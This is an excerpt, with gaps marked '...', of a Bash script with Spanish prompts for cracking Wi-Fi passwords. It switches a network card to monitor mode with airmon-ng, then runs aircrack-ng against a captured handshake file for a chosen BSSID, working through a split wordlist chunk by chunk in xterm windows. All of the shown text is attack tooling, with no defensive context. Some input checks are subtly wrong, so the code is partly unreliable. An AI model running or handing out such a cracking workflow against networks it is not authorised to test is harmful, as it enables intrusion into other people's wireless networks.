...
function interfaceModeMonitor(){
	...
	airmon-ng start $networkCard > /dev/null 2>&1; rm interface
...
function attackHandshake(){
	...
	echo -en "\t${yellowColour}Dividir diccionari(y/n): ${endColour}" && read multiCrack
	...
	if [ "$multiCrack" == "y"  ] || [ "$multiCrack" == "y" ]; then
		...
		check=0; for (( c=1; c<=$numReferi; c++ ))
		do
			if [ "$check" == "0" ]; then
				xterm -hold -e "aircrack-ng -w .TMP/dict${c}.txt -b $BSSID  Captura-01.cap" 2>/dev/null&
				xtermAircrackPIB=$!
				echo -e "\t\t${readColour}::${endColour} ${grayColour}Usando la parte ${c} del diccionario${endColour}"
				echo -en "\t\t${yellowColour}Siguinte(y/stop): ${endColour}" && read mode

				if [ "$mode" == "y" ] || [ "$mode" == "Y" ]; then
					sleep 1; kill -9 $xtermAircrackPIB 2>/dev/null; wait $xtermAircrackPIB 2>/dev/null	
				elif [ "$mode" == "stop" ] || [ "$mode" == "STOP" ]; then
					check=1; sleep 1
					echo -en "\t${yellowColour}Eliminar los diccionarios(y/n): ${endColour}" && read capOPT
						
					if [ "$capOPT" == "y" ] || [ "$capOPT" == "Y" ]; then
						rm dic* 2>/dev/null; sleep 1
						echo -e "\t\t${readColour}::${endColour} ${grayColour}Diccionarios borrados${endColour}"
				        fi
				else
					echo -e "\t\t${readColour}::${endColour} ${grayColour}Error${endColour}"
				fi
			fi
		done
